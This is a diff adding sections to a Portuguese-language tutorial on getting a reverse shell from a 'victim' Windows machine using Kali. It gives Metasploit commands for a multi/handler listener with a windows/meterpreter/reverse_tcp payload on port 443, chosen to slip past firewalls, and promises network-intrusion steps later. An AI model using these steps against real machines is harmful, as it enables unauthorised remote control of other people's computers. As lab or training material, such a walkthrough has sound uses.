@@ -31,9 +31,35 @@ windows se comunicar com o Kali normalmente.
 O reverse shell é um modo de se aproveitar da comunicação de saída entre as
 duas máquinas
 
+## 2. Entrando na rede
+para fazer esse tipo de ataque é preciso estar na mesma rede que a máquina
+vitima, caso contrário o ataque não funciona.
 
+Futuramente vou por aqui uma forma de invasão de redes para deixar o ataque
+mais completo levando em consideração uma situação em tempo real
 
+## 3 . Configurando o Listener (Multi/Handler)
+Um listener (ou handler) no Metasploit é um componente que aguarda / “escuta”
+uma conexão de rede de um payload já implantado no alvo.
 
+Para configurar o Listener use terminal do kali e o mesmo deve permanecer aberto.
+Seguindo os passos a seguir faça:
+
+### 1. Inicie o Metasploit:
+
+msfconsole
+
+### 2. Use o módulo genérico para receber conexões reversas:
+
+use exploit/multi/handler
+
+3. Configure o Payload (tipo de conexão que você vai receber):
+set payload windows/meterpreter/reverse_tcp
+4. Defina o LHOST (Seu IP de escuta):
+set LHOST <seu ip>
+5. Defina o LPORT (Porta de escuta – 443 ou 8080 são boas opções para sair do
+Firewall):
+set LPORT 443
 
 
 
